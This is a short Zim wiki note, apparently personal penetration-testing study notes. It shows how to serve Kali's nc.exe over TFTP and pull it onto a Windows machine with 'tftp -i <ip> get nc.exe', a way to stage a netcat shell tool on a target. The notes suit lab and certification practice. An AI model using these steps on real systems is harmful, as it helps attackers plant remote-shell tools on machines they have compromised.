@@ -1,0 +1,14 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2018-10-04T15:07:28+05:30
+
+====== File Upload-TFTP ======
+Created Thursday 04 October 2018
+
+#Setting TFTP Server in kali
+1. mkdir tftp
+2. atftpd --daemon --port 69 [[/tftp]]
+3. cp [[/usr/share/windows-binaries/nc.exe]] [[/tftp/]]
+
+#Invoking tftp client in windows
+1. tftp -i <ip> get nc.exe
